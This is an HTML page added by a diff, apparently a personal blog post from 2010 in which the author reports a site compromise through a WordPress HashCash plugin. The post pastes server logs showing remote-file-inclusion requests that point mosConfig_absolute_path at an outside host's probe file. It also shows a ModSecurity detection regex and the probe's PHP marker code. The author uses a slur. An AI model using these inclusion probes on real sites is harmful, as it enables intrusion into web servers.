@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html">
+  <head>
+    <title>Blog was hacked - Est's Blog</title>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+
+    <meta charset="utf-8" />
+    <link href="https://feeds.feedburner.com/initiative" type="application/rss+xml" rel="alternate" title="Est's Blog RSS Feed" />
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="Blog was hacked" />
+
+
+
+
+    <link rel="stylesheet" href="/theme/css/normalize.min.css" />
+    <link rel="stylesheet" href="/theme/css/style.css" />
+
+
+    <style>
+      body {
+        background: #ecedef url("/theme/img/ignasi_pattern_s.png") repeat;
+      }
+    </style>
+  </head>
+  <body class="single-body">
+<nav class="nav-bar side-padding">
+  <h1 class="nav-header"><a href="/" class="nav-text">
+    Est's Blog
+  </a></h1>
+  <div class="hamburger-menu">
+    <button onclick="hamburgerMenuPressed.call(this)" aria-haspopup="true" aria-expanded="false" aria-controls="menu" aria-label="Menu">
+      <span></span>
+      <span></span>
+    </button>
+    <ul id="menu" class="hamburger-menu-overlay">
+      <li><a href="/" class="hamburger-menu-overlay-link">Home</a></li>
+
+        <li><a href="/category/archive.html" class="hamburger-menu-overlay-link active">archive</a></li>
+        <li><a href="/category/stderr.html" class="hamburger-menu-overlay-link">stderr</a></li>
+        <li><a href="/category/stdin.html" class="hamburger-menu-overlay-link">stdin</a></li>
+        <li><a href="/category/stdout.html" class="hamburger-menu-overlay-link">stdout</a></li>
+
+    </ul>
+  </div>
+</nav>    <main class="content side-text-padding">
+
+
+<article class="post">
+  <header class="post-header">
+    <h2 class="post-title">Blog was hacked</h2>
+    <p class="post-date">Posted <time datetime="2010-01-05T14:41:48+00:00">2010-01-05</time> | <span>archive</span></p>
+  </header>
+
+  
+  <p>My blog was hacked by some fag from somewhere due to an exploit in Wordpress plugin HashCash.</p>
+
+<p>The server load surged to 300 and I have to disable Wordpress temporarily and re-install 2.9.1</p>
+
+<pre><code>77.221.130.17 - - [05/Jan/2010:04:01:27 -0800] &quot;GET //components/com_hashcash
+/server.php?mosConfig_absolute_path=http://photoworld.com.ua////zfxid1.txt?? 
+HTTP/1.1&quot; 503 532 &quot;-&quot; &quot;Mozilla/5.0&quot;
+77.221.130.17 - - [05/Jan/2010:04:01:27 -0800] &quot;GET /archives/242//components
+/com_hashcash/server.php?mosConfig_absolute_path=http://photoworld.com.ua////
+zfxid1.txt?? HTTP/1.1&quot; 503 532 &quot;-&quot; &quot;Mozilla/5.0&quot;
+77.221.130.17 - - [05/Jan/2010:04:01:27 -0800] &quot;GET /archives//components/com
+_hashcash/server.php?mosConfig_absolute_path=http://photoworld.com.ua////zfxi
+d1.txt?? HTTP/1.1&quot; 503 532 &quot;-&quot; &quot;Mozilla/5.0&quot;
+
+
+
+[Tue Jan 05 04:01:27 2010] [error] [client 77.221.130.17] ModSecurity: Access
+ denied with code 503 (phase 2). Pattern match &quot;=(http|www|ftp)\\:/(.+)\\.(c|
+ dat|kek|gif|jpe?g|jpeg|png|sh|txt|bmp|dat|txt|js|html?|tmp|asp)\\x20?\\?&quot; at
+  REQUEST_URI. [file &quot;/dh/apache2/template/etc/mod_sec2/gotroot/50_asl_rootki
+  ts.conf&quot;] [line &quot;23&quot;] [id &quot;390144&quot;] [rev &quot;2&quot;] [msg &quot;Command shell attack: G
+  eneric Attempt to remote include command shell&quot;] [severity &quot;CRITICAL&quot;] [hos
+  tname &quot;blog.est.im&quot;] [uri &quot;/components/com_hashcash/server.php&quot;] [unique_id
+   &quot;S0MqF0Wji1IAAEzEq5kAAAAK&quot;]
+[Tue Jan 05 04:01:27 2010] [error] [client 77.221.130.17] ModSecurity: Access
+ denied with code 503 (phase 2). Pattern match &quot;=(http|www|ftp)\\:/(.+)\\.(c|
+ dat|kek|gif|jpe?g|jpeg|png|sh|txt|bmp|dat|txt|js|html?|tmp|asp)\\x20?\\?&quot; at
+  REQUEST_URI. [file &quot;/dh/apache2/template/etc/mod_sec2/gotroot/50_asl_rootki
+  ts.conf&quot;] [line &quot;23&quot;] [id &quot;390144&quot;] [rev &quot;2&quot;] [msg &quot;Command shell attack: G
+  eneric Attempt to remote include command shell&quot;] [severity &quot;CRITICAL&quot;] [hos
+  tname &quot;blog.est.im&quot;] [uri &quot;/archives/242//components/com_hashcash/server.ph
+  p&quot;] [unique_id &quot;S0MqF0Wji1IAAEpmXZcAAAAJ&quot;]
+[Tue Jan 05 04:01:27 2010] [error] [client 77.221.130.17] ModSecurity: Access
+ denied with code 503 (phase 2). Pattern match &quot;=(http|www|ftp)\\:/(.+)\\.(c|
+ dat|kek|gif|jpe?g|jpeg|png|sh|txt|bmp|dat|txt|js|html?|tmp|asp)\\x20?\\?&quot; at
+  REQUEST_URI. [file &quot;/dh/apache2/template/etc/mod_sec2/gotroot/50_asl_rootki
+  ts.conf&quot;] [line &quot;23&quot;] [id &quot;390144&quot;] [rev &quot;2&quot;] [msg &quot;Command shell attack: G
+  eneric Attempt to remote include command shell&quot;] [severity &quot;CRITICAL&quot;] [hos
+  tname &quot;blog.est.im&quot;] [uri &quot;/archives//components/com_hashcash/server.php&quot;] 
+  [unique_id &quot;S0MqF0Wji1IAAEmWRFIAAAAI&quot;]
+
+http://photoworld.com.ua////zfxid1.txt
+
+zfxid.txt
+&lt;?php /* ZFxID */ echo(&quot;Shiro&quot;.&quot;Hige&quot;); die(&quot;Shiro&quot;.&quot;Hige&quot;); /* ZFxID */ ?&gt;
+</code></pre>
+
+<p>When upgrading Wordpress 2.9.1 I lost some of my modification to Wordpress, and I have to type them letter by letter again in a slow SSH terminal. Fuck!</p>
+
+</article>
+
+
+<div class="comments">
+  <h2>Comments</h2>
+  <div id="disqus_thread"></div>
+  <script type="text/javascript">
+    var disqus_shortname = 'estblog';
+    var disqus_identifier = 'archives/272';
+    var disqus_url = location.href;
+    (function() {
+    var dsq = document.createElement('script'); 
+
+    dsq.type = 'text/javascript';
+    dsq.defer = true;
+    dsq.src = '//estblog.disqus.com/embed.js';
+    (document.getElementsByTagName('body')[0] || document.getElementsByTagName('head')[0]).appendChild(dsq);
+    })();
+  </script>
+  <noscript>Please enable JavaScript to view the comments.</noscript>
+</div>    </main>
+<script src="/theme/js/core.js"></script>
+<script type="text/javascript">
+    if(location.protocol === "http:") location.protocol = "https:"
+</script>
+
+  </body>
+
+</html>
